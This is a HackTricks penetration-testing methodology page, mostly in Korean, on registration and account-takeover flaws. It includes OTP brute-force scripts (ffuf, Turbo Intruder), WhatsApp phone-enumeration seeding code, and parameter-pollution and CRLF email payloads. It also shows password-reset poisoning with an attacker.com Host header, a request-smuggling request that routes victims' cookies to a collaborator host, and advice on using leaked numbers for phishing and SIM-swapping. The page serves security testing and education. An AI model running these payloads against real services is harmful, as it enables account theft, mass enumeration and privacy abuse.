# 등록 및 Takeover 취약점

{{#include ../banners/hacktricks-training.md}}

## Registration Takeover

### Duplicate Registration

- 기존 사용자 이름으로 계정 생성 시도
- 이메일 변형 확인:
- 대문자 사용
- +1@
- 이메일에 점 추가
- 이메일 이름에 특수 문자 사용 (%00, %09, %20)
- 이메일 뒤에 공백 문자 넣기: `test@test.com a`
- victim@gmail.com@attacker.com
- victim@attacker.com@gmail.com
- 이메일 제공자 정규화(canonicalization) 우회 시도(서비스별로 다름):
- Gmail은 점과 subaddressing 무시: `victim+1@gmail.com`, `v.ic.tim@gmail.com` 는 `victim@gmail.com`으로 전달됨
- 일부 제공자는 로컬 파트에서 대소문자 구분을 하지 않음
- 일부 제공자는 unicode confusables를 허용함. 로컬 파트에 유사문자(homoglyphs)와 soft hyphen `\u00AD` 시도
- 이를 악용해: 고유성 검사 우회, 중복 계정/workspace 초대 획득, 또는 takeover 준비 중 피해자 회원가입 차단(임시 DoS)

### Username Enumeration

애플리케이션 내에서 특정 사용자 이름이 이미 등록되어 있는지 파악할 수 있는지 확인하세요.

- 서로 다른 에러 메시지나 HTTP 상태 코드
- 타이밍 차이(기존 사용자는 IdP/DB 조회를 유발할 수 있음)
- 알려진 이메일에 대한 등록 폼의 프로필 데이터 자동완성
- 팀/초대 흐름 확인: 이메일 입력 시 계정 존재 여부가 드러날 수 있음

### Password Policy

사용자 생성 시 비밀번호 정책을 확인하세요(약한 비밀번호 사용 가능 여부).\
그럴 경우 크래킹(브루트포스) 시도를 할 수 있습니다.

### SQL Injection

[**Check this page** ](sql-injection/index.html#insert-statement)to learn how to attempt account takeovers or extract information via **SQL Injections** in registry forms.

### Oauth Takeovers


{{#ref}}
oauth-to-account-takeover.md
{{#endref}}

### SAML Vulnerabilities


{{#ref}}
saml-attacks/
{{#endref}}

### Change Email

등록된 상태에서 이메일 변경을 시도하고 해당 변경이 올바르게 검증되는지, 임의의 이메일로 바꿀 수 있는지 확인하세요.

### More Checks

- **disposable emails**(mailinator, yopmail, 1secmail 등)을 사용할 수 있는지 또는 `victim+mailinator@gmail.com` 같은 subaddressing으로 차단목록 우회 가능한지 확인
- **긴** **password**(>200)는 **DoS**로 이어질 수 있음
- **계정 생성에 대한 rate limits 확인**
- username@**burp_collab**.net 사용 후 **callback** 분석
- 전화번호 인증이 사용된다면, 전화번호 파싱/인젝션 엣지케이스 확인

{{#ref}}
phone-number-injections.md
{{#endref}}

{{#ref}}
captcha-bypass.md
{{#endref}}

### Contact-discovery / identifier-enumeration oracles

전화번호 중심 메신저는 클라이언트가 연락처를 동기화할 때마다 **presence oracle**을 노출합니다. WhatsApp의 discovery 요청을 재생하면 역사적으로 **>100M lookups per hour**가 가능해 거의 완전한 계정 열거가 가능했습니다.

**Attack workflow**

1. 공식 클라이언트를 **계측(instrument)** 하여 주소록 업로드 요청(정규화된 E.164 번호의 인증된 blob)을 캡처합니다. 동일한 쿠키/기기 토큰을 재사용하면서 공격자가 생성한 번호로 재생합니다.
2. **한 요청에 다수의 번호 배치**: WhatsApp은 수천 개의 식별자를 허용하며 등록/미등록과 메타데이터(비즈니스, companion 등)를 반환합니다. 응답을 오프라인으로 분석해 피해자에게 메시지를 보내지 않고 타깃 리스트를 구축합니다.
3. SIM bank, cloud devices, 또는 residential proxies로 열거를 수평 확장하여 계정/IP/ASN별 쓰로틀링이 발생하지 않게 합니다.

**Dialing-plan modeling**

각 국가의 다이얼링 플랜을 모델링해 유효하지 않은 후보를 건너뛰세요. NDSS dataset (`country-table.*`)은 국가 코드, 채택 밀도, 플랫폼 분할을 제공하므로 적중률이 높은 범위를 우선순위로 둘 수 있습니다. Example seeding code:
```python
import pandas as pd
from itertools import product

df = pd.read_csv("country-table.csv")
row = df[df["Country"] == "India"].iloc[0]
prefix = "+91"  # India mobile numbers are 10 digits
for suffix in product("0123456789", repeat=10):
candidate = prefix + "".join(suffix)
enqueue(candidate)
```
Prioritise prefixes that match real allocations (Mobile Country Code + National Destination Code) before querying the oracle to keep throughput useful.

**enumerations을 표적화된 공격으로 전환하기**

- phishing, SIM-swapping, 또는 spamming 전에 어떤 신원이 여전히 활성 상태인지 파악하기 위해 leaked phone numbers(예: Facebook’s 2021 breach)를 oracle에 투입하세요.
- 국가/OS/앱 유형별로 인구조사를 분할하여 SMS filtering이 약하거나 WhatsApp Business 채택률이 높은 지역을 찾아 현지화된 social engineering에 활용하세요.

**Public-key reuse correlation**

WhatsApp는 세션 설정 중 각 계정의 X25519 identity key를 노출합니다. 모든 enumerated 번호에 대해 identity material을 요청하고 public keys를 중복 제거하면 account farms, cloned clients, 또는 insecure firmware가 드러납니다 — shared keys는 multi-SIM 운영의 익명성을 제거합니다.

## 취약한 이메일/전화 검증 (OTP/Magic Link)

Registration flows는 종종 숫자 OTP 또는 magic-link 토큰으로 소유권을 검증합니다. 일반적인 취약점:

- 추측 가능하거나 짧은 OTP(4–6 digits)로 rate limiting이나 IP/device tracking이 효과적이지 않은 경우. 병렬 추측 및 header/IP 회전을 시도하세요.
- OTP가 여러 동작 또는 계정에서 재사용되거나 특정 사용자/동작에 바인딩되어 있지 않은 경우(예: 동일 코드가 login과 signup에 모두 작동하거나 이메일 변경 후에도 작동).
- Multi-value smuggling: 일부 백엔드는 여러 코드를 허용하고 그중 하나라도 일치하면 인증합니다. 시도해보세요:
- `code=000000&code=123456`
- JSON arrays: `{"code":["000000","123456"]}`
- Mixed parameter names: `otp=000000&one_time_code=123456`
- Comma/pipe separated values: `code=000000,123456` or `code=000000|123456`
- Response oracle: status/message/body 길이로 wrong vs expired vs wrong-user 코드를 구분하세요.
- 토큰이 성공 후 또는 password/email 변경 후 무효화되지 않음.
- Verification token이 user agent/IP에 묶여있지 않아 attacker-controlled 페이지에서 cross-origin으로 완료될 수 있음.

Bruteforcing example with ffuf against a JSON OTP endpoint:
```bash
ffuf -w <wordlist_of_codes> -u https://target.tld/api/verify -X POST \
-H 'Content-Type: application/json' \
-d '{"email":"victim@example.com","code":"FUZZ"}' \
-fr 'Invalid|Too many attempts' -mc all
```
순차적 잠금(sequential lockouts)을 우회하기 위한 Parallel/concurrent guessing (Burp의 Turbo Intruder 사용):

<details>
<summary>6자리 OTP 시도를 대량으로 전송하기 위한 Turbo Intruder 스니펫</summary>
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100)
for code in range(0,1000000):
body = '{"email":"victim@example.com","code":"%06d"}' % code
engine.queue(target.req, body=body)


def handleResponse(req, interesting):
if req.status != 401 and b'Invalid' not in req.response:
table.add(req)
```
</details>

- Try racing verification: 동일한 유효한 OTP를 두 개의 세션에서 동시에 제출해 보세요; 때로는 한 세션이 검증된 attacker account가 되는 동안 피해자 흐름도 성공합니다.
- Also test Host header poisoning on verification links (same as reset poisoning below) to leak or complete verification on attacker controlled host.

{{#ref}}
rate-limit-bypass.md
{{#endref}}

{{#ref}}
2fa-bypass.md
{{#endref}}

{{#ref}}
email-injections.md
{{#endref}}

## Account Pre‑Hijacking Techniques (before the victim signs up)

A powerful class of issues occurs when an attacker performs actions on the victim’s email before the victim creates their account, then regains access later.

Key techniques to test (adapt to the target’s flows):

- Classic–Federated Merge
- Attacker: registers a classic account with victim email and sets a password
- Victim: later signs up with SSO (same email)
- Insecure merges may leave both parties logged in or resurrect the attacker’s access
- Unexpired Session Identifier
- Attacker: creates account and holds a long‑lived session (don’t log out)
- Victim: recovers/sets password and uses the account
- Test if old sessions stay valid after reset or MFA enablement
- Trojan Identifier
- Attacker: adds a secondary identifier to the pre‑created account (phone, additional email, or links attacker’s IdP)
- Victim: resets password; attacker later uses the trojan identifier to reset/login
- Unexpired Email Change
- Attacker: initiates email‑change to attacker mail and withholds confirmation
- Victim: recovers the account and starts using it
- Attacker: later completes the pending email‑change to steal the account
- Non‑Verifying IdP
- Attacker: uses an IdP that does not verify email ownership to assert `victim@…`
- Victim: signs up via classic route
- Service merges on email without checking `email_verified` or performing local verification

Practical tips

- 웹/모바일 번들에서 흐름과 엔드포인트를 수집하세요. classic signup, SSO linking, email/phone change, 그리고 password reset 엔드포인트를 찾으세요.
- 다른 흐름을 테스트하는 동안 세션을 유지하도록 현실적인 자동화를 만드세요.
- For SSO tests, stand up a test OIDC provider and issue tokens with `email` claims for the victim address and `email_verified=false` to check if the RP trusts unverified IdPs.
- 비밀번호 재설정 또는 이메일 변경 후에는 다음을 확인하세요:
- 모든 다른 세션과 토큰이 무효화되었는지,
- 보류 중인 이메일/전화 변경 기능이 취소되었는지,
- 이전에 연동된 IdPs/이메일/전화번호가 재검증되었는지.

Note: Extensive methodology and case studies of these techniques are documented by Microsoft’s pre‑hijacking research (see References at the end).

{{#ref}}
reset-password.md
{{#endref}}

{{#ref}}
race-condition.md
{{#endref}}

## **Password Reset Takeover**

### Password Reset Token Leak Via Referrer <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. Request password reset to your email address
2. Click on the password reset link
3. Don’t change password
4. Click any 3rd party websites(eg: Facebook, twitter)
5. Intercept the request in Burp Suite proxy
6. Check if the referer header is leaking password reset token.

### Password Reset Poisoning <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Intercept the password reset request in Burp Suite
2. Add or edit the following headers in Burp Suite : `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Forward the request with the modified header\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. Look for a password reset URL based on the _host header_ like : `https://attacker.com/reset-password.php?token=TOKEN`

### Password Reset Via Email Parameter <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```bash
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR on API Parameters <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. Attacker는 자신의 계정으로 로그인한 후 **Change password** 기능으로 이동해야 한다.
2. Burp Suite를 실행하고 요청을 Intercept한다.
3. 요청을 Repeater 탭으로 보내고 파라미터를 수정한다: User ID/email\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### Weak Password Reset Token <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

The password reset token should be randomly generated and unique every time.\
토큰이 만료되는지 또는 항상 동일한지 확인해보라. 경우에 따라 생성 알고리즘이 약해 추측될 수 있다. 알고리즘에 사용될 수 있는 변수는 다음과 같다.

- Timestamp
- UserID
- Email of User
- Firstname and Lastname
- Date of Birth
- Cryptography
- Number only
- Small token sequence ( characters between \[A-Z,a-z,0-9])
- Token reuse
- Token expiration date

### Leaking Password Reset Token <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. 특정 이메일(e.g: test@mail.com)에 대해 API/UI를 사용해 password reset 요청을 트리거한다.
2. 서버 응답을 검사하고 `resetToken`을 확인한다.
3. 그런 다음 토큰을 다음과 같은 URL에 사용한다: `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Password Reset Via Username Collision <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. 피해자의 username과 동일하지만 username 앞뒤로 공백을 삽입한 사용자명으로 시스템에 등록한다. e.g: `"admin "`
2. 악의적인 username으로 password reset을 요청한다.
3. 이메일로 전송된 토큰을 사용해 피해자의 비밀번호를 재설정한다.
4. 새 비밀번호로 피해자 계정에 로그인한다.

플랫폼 CTFd는 이 공격에 취약했다.\
See: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Account Takeover Via Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. 애플리케이션이나 서브도메인에서 XSS를 찾는다 — 쿠키가 부모 도메인으로 scope되어 있는 경우: `*.domain.com`
2. Leak the current **sessions cookie**
3. 해당 쿠키를 사용해 사용자로 인증한다.

### Account Takeover Via HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1. **smuggler**를 사용해 HTTP Request Smuggling 유형(CL, TE, CL.TE)을 탐지한다.\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2. 다음 데이터로 `POST / HTTP/1.1`를 덮어쓰는 요청을 구성한다:\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` — 목적은 victims를 burpcollab로 open redirect 시켜 쿠키를 탈취하는 것이다.\
3. 최종 요청은 다음과 같이 보일 수 있다
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Hackerone에서 이 버그를 악용했다고 보고함\
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### CSRF를 통한 계정 탈취 <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. CSRF용 페이로드를 생성, 예: “HTML form with auto submit for a password change”
2. 페이로드 전송

### JWT를 통한 계정 탈취 <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token은 사용자 인증에 사용될 수 있습니다.

- JWT의 User ID / Email을 다른 것으로 수정
- 취약한 JWT 서명 여부 확인


{{#ref}}
hacking-jwt-json-web-tokens.md
{{#endref}}

## Registration-as-Reset (Upsert on Existing Email)

일부 signup 핸들러는 제공된 이메일이 이미 존재할 때 upsert를 수행합니다. 만약 endpoint가 이메일과 비밀번호만 포함된 최소한의 바디를 허용하고 소유권 검증을 강제하지 않으면, 피해자의 이메일을 전송하여 인증 이전에 비밀번호를 덮어쓸 수 있습니다.

- 발견: 번들된 JS(또는 모바일 앱 트래픽)에서 endpoint 이름을 수집한 뒤, ffuf/dirsearch를 사용해 /parents/application/v4/admin/FUZZ 같은 base path를 fuzz합니다.
- 방법 힌트: "Only POST request is allowed." 같은 메시지를 반환하는 GET은 올바른 메서드가 POST임을, 그리고 JSON 바디가 예상됨을 나타내는 경우가 많습니다.
- 실제 사례에서 관찰된 최소 바디:
```json
{"email":"victim@example.com","password":"New@12345"}
```
예제 PoC:
```http
POST /parents/application/v4/admin/doRegistrationEntries HTTP/1.1
Host: www.target.tld
Content-Type: application/json

{"email":"victim@example.com","password":"New@12345"}
```
영향: reset token, OTP 또는 email verification 없이 Full Account Takeover (ATO)이 가능합니다.

## 참고자료

- [How I Found a Critical Password Reset Bug (Registration upsert ATO)](https://s41n1k.medium.com/how-i-found-a-critical-password-reset-bug-in-the-bb-program-and-got-4-000-a22fffe285e1)
- [Microsoft MSRC – Pre‑hijacking attacks on web user accounts (May 2022)](https://msrc.microsoft.com/blog/2022/05/pre-hijacking-attacks/)
- [https://salmonsec.com/cheatsheet/account_takeover](https://salmonsec.com/cheatsheet/account_takeover)
- [Hey there! You are using WhatsApp: Enumerating Three Billion Accounts for Security and Privacy (NDSS 2026 paper & dataset)](https://github.com/sbaresearch/whatsapp-census)

{{#include ../banners/hacktricks-training.md}}
